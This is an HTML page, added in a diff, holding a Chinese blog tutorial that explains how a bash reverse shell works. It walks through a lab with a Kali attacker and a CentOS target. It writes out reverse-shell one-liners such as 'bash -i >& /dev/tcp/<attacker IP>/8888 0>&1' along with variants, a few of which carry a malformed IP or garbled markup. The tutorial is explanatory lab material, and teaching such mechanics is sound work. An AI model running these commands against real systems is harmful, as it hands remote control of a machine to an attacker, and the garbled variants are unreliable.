@@ -1,0 +1,590 @@
+<!doctype html>
+<html lang="en-us">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <title>Linux之bash反弹shell原理浅析 | 开发者问答集锦</title>
+    <meta property="og:title" content="Linux之bash反弹shell原理浅析 - 开发者问答集锦">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+    <meta name="Keywords" content="">
+    <meta name="description" content="Linux之bash反弹shell原理浅析">
+        
+    <meta name="author" content="">
+    <meta property="og:url" content="https://zaina.newban.cn/posts/linux%E4%B9%8Bbash%E5%8F%8D%E5%BC%B9shell%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://zaina.newban.cn">
+                        开发者问答集锦
+                    </a>
+                
+                
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="" href="https://zaina.newban.cn">首页</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    
+    <article class="post">
+        <header>
+            <h1 class="post-title">Linux之bash反弹shell原理浅析</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2020年9月2日
+        </date>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="post-content">
+            
+
+<p>#</p>
+
+<h1 id="环境">环境</h1>
+
+<p><strong>攻击机：kali ip：192.168.25.144</strong></p>
+
+<p><strong>靶 机：centos ip：192.168.25.142</strong></p>
+
+<h1 id="过程">过程</h1>
+
+<p>kali 监听本地8888端口</p>
+
+<p><a href="https://img.it610.com/image/info8/daae748c6e714822a44edd3d8fb68f18.jpg"><img src="https://img.it610.com/image/info8/daae748c6e714822a44edd3d8fb68f18.jpg" alt="" /></a></p>
+
+<p>靶机 centos 写入 反弹shell 的命令</p>
+
+<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.25.144/8888 0&gt;&amp;1
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/88e31503482d4b2f9d9e01855909c0a7.png"><img src="https://img.it610.com/image/info8/88e31503482d4b2f9d9e01855909c0a7.png" alt="" /></a></p>
+
+<p>攻击机 kali 成功反弹shell</p>
+
+<p><a href="https://img.it610.com/image/info8/d0fbe45b6463471080a15f52157d4288.jpg"><img src="https://img.it610.com/image/info8/d0fbe45b6463471080a15f52157d4288.jpg" alt="Linux之bash反弹shell原理浅析_第1张图片" /></a></p>
+
+<h1 id="原理">原理</h1>
+
+<p><strong>反弹shell</strong> 往往是在 <strong>攻击者</strong> 无法直接连接 <strong>受害者</strong>
+的情况下进行的操作，原因有很多，例如目标是局域网，或者开启防火墙的某些策略等情况，而这时，我们就可以让 <strong>受害者主动向攻击者发起连接，被控端</strong>
+发起请求到 <strong>控制端</strong> 某端口，并将其命令行的输入输出转到 <strong>控制端，从而</strong> <strong>实现交互</strong></p>
+
+<p>我们将命令拆开</p>
+
+<pre><code>bash -i 
+
+
+/dev/tcp/192.168.25.144/8888
+
+
+ &gt;&amp;   0&gt;&amp;1
+</code></pre>
+
+<h2 id="bash"><strong>bash</strong></h2>
+
+<p>Linux中一般默认的shell是 <strong>bash</strong> ，它功能几乎可以涵盖shell所具有的功能，所以一般的shell脚本都会指定它为执行路径</p>
+
+<p>常用的shell有 <strong>ash、bash、dash、ksh、csh、zsh</strong> 等，不同的shell都有自己的特点以及用途</p>
+
+<p><strong>查询当前shell命令</strong> <strong>ls -l /bin/sh</strong></p>
+
+<p>###
+<a href="https://img.it610.com/image/info8/94432ffa11c342feb4b2ecc9bfbf1e74.png"><img src="https://img.it610.com/image/info8/94432ffa11c342feb4b2ecc9bfbf1e74.png" alt="" /></a></p>
+
+<p><a href="https://img.it610.com/image/info8/9f61c0e073464a608c9bd2ad14b4abe6.jpg"><img src="https://img.it610.com/image/info8/9f61c0e073464a608c9bd2ad14b4abe6.jpg" alt="" /></a></p>
+
+<p><strong>bash -i</strong> 打开一个交互式的bash shell 如果有 <strong>-i</strong> 参数，就是交互式的</p>
+
+<p>交互的意思就是可以和用户进行交互，输入命令，回显给用户就是一个交互的过程，而执行一个shell脚本就是非交互的</p>
+
+<p>使用命令 <strong>echo $-</strong> 可以查看是否是交互式shell</p>
+
+<p><a href="https://img.it610.com/image/info8/2f6e4d03176749148f2276b35da5812c.png"><img src="https://img.it610.com/image/info8/2f6e4d03176749148f2276b35da5812c.png" alt="" /></a>
+有参数 <strong>i ，</strong> 是交互式的</p>
+
+<p>执行一个shell脚本</p>
+
+<p><a href="https://img.it610.com/image/info8/18bd721ef1a14241ad112f427e1f800f.png"><img src="https://img.it610.com/image/info8/18bd721ef1a14241ad112f427e1f800f.png" alt="" /></a>
+无参数 <strong>i ，</strong> 非交互式</p>
+
+<h2 id="dev目录">/dev目录</h2>
+
+<p>dev是设备(device)的英文缩写。这里主要存放与设备（包括外设）有关的文件， <strong>Linux一切皆文件</strong></p>
+
+<p><strong>/dev/tcp/</strong>
+是Linux中的一个特殊设备，打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/</p>
+
+<pre><code>/dev/tcp/192.168.25.144/8888
+</code></pre>
+
+<p>所以上述命令就是和192.168.25.144：8888建立TCP连接</p>
+
+<h2 id="文件描述符"><strong>文件描述符</strong></h2>
+
+<p><strong>Linux
+系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件。</strong></p>
+
+<p><strong>所有执行I/O操作的系统调用都会通过文件描述符，即文件描述符可控制输入输出（输入/输出重定向</strong> <strong>）</strong></p>
+
+<p><strong>标准输入(stdin): 代码为 0 使用 &lt; 或 &lt;</strong></p>
+
+<p><strong>标准输出(stdout): 代码为 1 使用 &gt; 或 &gt;&gt; 默认设备显示器</strong></p>
+
+<p><strong>标准错误输出(stderr): 代码为 2 使用 2 &gt; 或 2&gt;&gt; 默认设备显示器</strong></p>
+
+<pre><code> ---       +--------+
+( 0 ) ----&gt;|dev/tty0|    当开启一个终端时 默认的文件描述符 指向  /dev/tty0（虚拟终端）
+ ---       +--------+ 
+
+ ---       +--------+  
+( 1 ) ----&gt;|dev/tty0|  
+ ---       +--------+    
+
+ ---       +--------+  
+( 2 ) ----&gt;|dev/tty0| 
+ ---       +--------+
+</code></pre>
+
+<p>大多数Linux
+系统命令从你的终端接受输入并将所产生的输出发送回​​到您的终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输出写入到标准输出，默认情况下，这也是你的终端</p>
+
+<p><a href="https://img.it610.com/image/info8/514e0215cc354607bd6e119152df40de.png"><img src="https://img.it610.com/image/info8/514e0215cc354607bd6e119152df40de.png" alt="" /></a></p>
+
+<h2 id="shell-输入-输出重定向">Shell 输入/输出重定向</h2>
+
+<p>我们让上图 <strong>输出重定向</strong></p>
+
+<p>使用 **1 &gt; **将输出结果写入到 指定文件中 文件不存在则创建文件，文件如果存在会覆盖原文件内容</p>
+
+<p>省略不写则默认就是 1 同理，输入重定向 <strong>0省略不写则默认就是 0</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/ab36a54f94184c0eb032004a77a66979.png"><img src="https://img.it610.com/image/info8/ab36a54f94184c0eb032004a77a66979.png" alt="Linux之bash反弹shell原理浅析_第2张图片" /></a></p>
+
+<p><a href="https://img.it610.com/image/info8/c7aecf6e6b784a96ae2bcb1952d0555a.png"><img src="https://img.it610.com/image/info8/c7aecf6e6b784a96ae2bcb1952d0555a.png" alt="" /></a></p>
+
+<p>使用 ** &gt;&gt; ** 会追内容在文件末尾</p>
+
+<p><a href="https://img.it610.com/image/info8/53eb961bd9684b49a075e9e3bd7a34ee.png"><img src="https://img.it610.com/image/info8/53eb961bd9684b49a075e9e3bd7a34ee.png" alt="Linux之bash反弹shell原理浅析_第3张图片" /></a></p>
+
+<p>结合上面建立的TCP连接</p>
+
+<p><a href="https://img.it610.com/image/info8/d05ff250ad2c46f7ad095e933ca215c4.jpg"><img src="https://img.it610.com/image/info8/d05ff250ad2c46f7ad095e933ca215c4.jpg" alt="" /></a></p>
+
+<p><a href="https://img.it610.com/image/info8/03e18295f28b4510b2b92e958b73aa21.png"><img src="https://img.it610.com/image/info8/03e18295f28b4510b2b92e958b73aa21.png" alt="" /></a></p>
+
+<p>kali攻击机收到</p>
+
+<p><a href="https://img.it610.com/image/info8/7c8a1c8fa4484e3a9ce7b01fb3ffcf1e.jpg"><img src="https://img.it610.com/image/info8/7c8a1c8fa4484e3a9ce7b01fb3ffcf1e.jpg" alt="Linux之bash反弹shell原理浅析_第4张图片" /></a></p>
+
+<p>结合 <strong>bash -i</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/c46b3e4957c14459bf8837c213bffe96.jpg"><img src="https://img.it610.com/image/info8/c46b3e4957c14459bf8837c213bffe96.jpg" alt="" /></a></p>
+
+<p><a href="https://img.it610.com/image/info8/b25f2c4e0e874066a80f615cbd7e69d2.png"><img src="https://img.it610.com/image/info8/b25f2c4e0e874066a80f615cbd7e69d2.png" alt="" /></a></p>
+
+<p>在kali得到命令执行结果的回显</p>
+
+<p><a href="https://img.it610.com/image/info8/4c5830457e4f4a67b4479a6f104233c4.jpg"><img src="https://img.it610.com/image/info8/4c5830457e4f4a67b4479a6f104233c4.jpg" alt="Linux之bash反弹shell原理浅析_第5张图片" /></a></p>
+
+<p>此时我们输入name，可以看到，标准输出错误并未被重定向</p>
+
+<p><a href="https://img.it610.com/image/info8/d1c2e0c823224732bd916d1e175b28c4.png"><img src="https://img.it610.com/image/info8/d1c2e0c823224732bd916d1e175b28c4.png" alt="" /></a></p>
+
+<pre><code> ---       +--------+
+( 0 ) ----&gt;|dev/tty0|
+ ---       +--------+ 
+
+ ---       +--------+           +------------------+
+( 1 ) ----&gt;|dev/tty0|   ----&gt;   |/dev/tcp/host/port|
+ ---       +--------+           +------------------+
+
+ ---       +--------+  
+( 2 ) ----&gt;|dev/tty0| 
+ ---       +--------+
+</code></pre>
+
+<p><strong>输入重定向</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/c46b3e4957c14459bf8837c213bffe96.jpg"><img src="https://img.it610.com/image/info8/c46b3e4957c14459bf8837c213bffe96.jpg" alt="" /></a></p>
+
+<p><a href="https://img.it610.com/image/info8/7038ab80e0824f42a93cd4207d016972.png"><img src="https://img.it610.com/image/info8/7038ab80e0824f42a93cd4207d016972.png" alt="" /></a></p>
+
+<p>在kali攻击机，输入</p>
+
+<p><a href="https://img.it610.com/image/info8/7e447d4d236441a8a2f536090cf49281.jpg"><img src="https://img.it610.com/image/info8/7e447d4d236441a8a2f536090cf49281.jpg" alt="Linux之bash反弹shell原理浅析_第6张图片" /></a></p>
+
+<p>靶机得到输入指令，标准输出（默认终端）</p>
+
+<p><a href="https://img.it610.com/image/info8/c60b8aaea5d246449fe1e7d6205bc2c6.png"><img src="https://img.it610.com/image/info8/c60b8aaea5d246449fe1e7d6205bc2c6.png" alt="" /></a></p>
+
+<pre><code> ---       +--------+
+( 0 ) ----&gt;|dev/tty0|\
+ ---       +--------+ \
+                       \
+ ---       +--------+   ----&gt;   +------------------+
+( 1 ) ----&gt;|dev/tty0|           |/dev/tcp/host/port|
+ ---       +--------+           +------------------+
+
+ ---       +--------+  
+( 2 ) ----&gt;|dev/tty0| 
+ ---       +--------+
+</code></pre>
+
+<p>！！！！！！！！！！！！！！！</p>
+
+<p>此时，我们只需要将</p>
+
+<p><strong>bash i &gt; /dec/tcp/192.168.25.<sup>144</sup>&frasl;<sub>8888</sub></strong> 和 <strong>bash i 结合</strong></p>
+
+<p>实现在攻击机 kali 输入 命令，在kali 机 得到命令回显， <strong>实现了反弹shell</strong></p>
+
+<p><strong>即 使用下面的命令</strong></p>
+
+<pre><code>bash -i &gt; /dev/tcp/192.168.25.144/8888 0&gt;&amp;1
+</code></pre>
+
+<p>###</p>
+
+<p>效果 kali ip：192.168.25.140</p>
+
+<p><a href="https://img.it610.com/image/info8/e9ca4a3bd3a84b3c8aa6822b14df33bd.jpg"><img src="https://img.it610.com/image/info8/e9ca4a3bd3a84b3c8aa6822b14df33bd.jpg" alt="Linux之bash反弹shell原理浅析_第7张图片" /></a></p>
+
+<p><a href="https://img.it610.com/image/info8/7ddb5a531c9748b3a19108483cb21751.png"><img src="https://img.it610.com/image/info8/7ddb5a531c9748b3a19108483cb21751.png" alt="" /></a></p>
+
+<p>此时 <strong>靶机会输出在攻击机所输入的命令</strong> ，还有一个问题，标准错误输出 并没有重定向</p>
+
+<p><a href="https://img.it610.com/image/info8/566809d744d84bb4bc9e40bca008d5ab.jpg"><img src="https://img.it610.com/image/info8/566809d744d84bb4bc9e40bca008d5ab.jpg" alt="" /></a></p>
+
+<p><a href="https://img.it610.com/image/info8/84c4d68231744875b222d205db58fb9a.png"><img src="https://img.it610.com/image/info8/84c4d68231744875b222d205db58fb9a.png" alt="" /></a></p>
+
+<p>补充：</p>
+
+<p><strong>bash</strong> 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向，存在多个则从左往右依次执行</p>
+
+<h3 id="标准输出与标准错误输出重定向"><strong>标准输出与标准错误输出重定向</strong></h3>
+
+<p>此时反弹shell语句里边用到了 ** &gt;&amp; ** 操作符， **&gt; &amp; ** 操作符在不同情况下有不通的含义</p>
+
+<p>在 <strong>&gt; &amp;word</strong> 语法中，当 <strong>word</strong> 是数字或 <strong>-</strong> 字符时，操作符 ** &gt;&amp; ** 表示 <strong>复制</strong> 文件描述符</p>
+
+<p>而文件描述符的复制格式有 **num1 和 **num1 &gt;&amp;num2 ****</p>
+
+<p>这里两个 <strong>都是将文件描述符 num1 复制到 num2</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开</p>
+
+<p>**** 因此 **num1 和 <strong>num1 &gt;&amp;num2</strong> 是等价的（读/写方式打开对其没有任何影响）**</p>
+
+<p>所以上述命令可以修改为 <strong>bash -i &gt; /dev/tcp/192.168.25.<sup>144</sup>&frasl;<sub>8888</sub> 0</strong></p>
+
+<p>所以 <strong>0 &gt;&amp;1 或者 0</strong></p>
+
+<p>是对文件描述符的 <strong>拷贝</strong> ，是将0[标准输入]重定向到了1[标准输出]指向的位置</p>
+
+<p><strong>此时1[标准输出]指向的是socket连接文件（第一个 &gt; ）</strong>，</p>
+
+<p>重定向完成后，0[标准输入]也指向了socket连接文件， <strong>所以我推测因为拷贝，所以原标准输出回显到靶机上（kali上敲的命 令）</strong></p>
+
+<pre><code> ---       +--------+
+( 0 ) ----&gt;|dev/tty0|\
+ ---       +--------+ \
+                       \
+ ---       +--------+   ----&gt;   +------------------+
+( 1 ) ----&gt;|dev/tty0|   ----&gt;   |/dev/tcp/host/port|
+ ---       +--------+           +------------------+
+
+ ---       +--------+  
+( 2 ) ----&gt;|dev/tty0| 
+ ---       +--------+
+</code></pre>
+
+<p>此时标准错误输出 依然未曾改变</p>
+
+<p>在 ** &gt;&amp;word** 语法中，当word不是数字或 <strong>-</strong> 字符时 ** &gt;&amp; **表示将 <strong>标准错误输出合并到标准输出中</strong></p>
+
+<p><strong>此时与操作符 &amp;&gt; 功能一样 &gt;&amp;word</strong> 等价于 <strong>&amp; &gt; word</strong> 都相当于 <strong>&gt; word</strong> <strong>2 &gt;&amp;1</strong></p>
+
+<p>当执行 <strong>bash -i &gt; /dev/tcp/192.168.25.<sup>140</sup>&frasl;<sub>9999</sub></strong> **0 &gt;&amp;1 ** 命令时，效果如下
+标准输出错误并未被重定向</p>
+
+<p><a href="https://img.it610.com/image/info8/d1c2e0c823224732bd916d1e175b28c4.png"><img src="https://img.it610.com/image/info8/d1c2e0c823224732bd916d1e175b28c4.png" alt="" /></a></p>
+
+<p>所以我们执行命令 <strong>bash -i &gt; /dev/tcp/192.168.25.<sup>140</sup>&frasl;<sub>9999</sub> 0&gt;&amp;1 2&gt;&amp;1 或</strong></p>
+
+<p><strong>bash -i &gt;&amp; /dev/tcp/192.168.25.<sup>140</sup>&frasl;<sub>9999</sub> 0&gt;&amp;1 均形成了一个闭合的回路 ，同样，命令回显到攻击机上</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/2820ef6e08784058b2b48b6d056bf5be.jpg"><img src="https://img.it610.com/image/info8/2820ef6e08784058b2b48b6d056bf5be.jpg" alt="Linux之bash反弹shell原理浅析_第8张图片" /></a></p>
+
+<p>实现以下效果形成闭合，即可反弹shell ，而其他一些反弹命令，只要可以形成如下效果即可</p>
+
+<pre><code> ---       +--------+
+( 0 ) ----&gt;|dev/tty0|\
+ ---       +--------+ \
+                       \
+ ---       +--------+   ----&gt;   +------------------+
+( 1 ) ----&gt;|dev/tty0|   ----&gt;   |/dev/tcp/host/port|
+ ---       +--------+   ----&gt;   +------------------+
+                        /
+ ---       +--------+  /
+( 2 ) ----&gt;|dev/tty0| / 
+ ---       +--------+
+
+
+bash -i &gt;&amp; /dev/tcp/192.168.146.25.144/8888 
+
+
+bash -i &gt;&amp; /dev/tcp/192.168.146.25.144/8888 
+
+
+bash -i &gt;&amp; /dev/tcp/192.168.146.25.144/8888 0
+
+
+bash -i &gt;&amp; /dev/tcp/192.168.146.25.144/8888 0
+
+
+bash -i &gt;&amp; /dev/tcp/192.168.146.25.144/8888 0&gt;&amp;1
+
+
+
+bash -i &gt;&amp; /dev/tcp/192.168.146.25.144/8888 0&gt;&amp;2
+
+
+
+bash -i  &gt; /dev/tcp/192.168.25.144/8888 0&gt;&amp;1 2&gt;&amp;1
+</code></pre>
+
+<p>等</p>
+
+<p>本文借鉴了很多大佬的博客，如有更正的地方。还望指出</p>
+
+<p>参考链接：</p>
+
+<p><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>
+
+<p><a href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html">https://www.gnu.org/software/bash/manual/html_node/Redirections.html</a></p>
+
+<p><a href="http://wiki.bash-hackers.org/howto/redirection_tutorial">http://wiki.bash-hackers.org/howto/redirection_tutorial</a></p>
+
+<p><a href="https://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/">https://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/</a></p>
+
+        </div>
+
+        
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a></li>
+        
+        <li><a href="/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/">009Shell脚本下条件测试eqne</a></li>
+        
+        <li><a href="/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/">00Pythonmanagepyshell和Python的分析</a></li>
+        
+        <li><a href="/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a></li>
+        
+        <li><a href="/posts/018dockerfileshell/">018DockerfileSHELL</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='https://zaina.newban.cn/tags/shell'>shell</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/categories">分类</a></h3>
+<ul class="widget-list">
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/tags">标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
+    
+    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
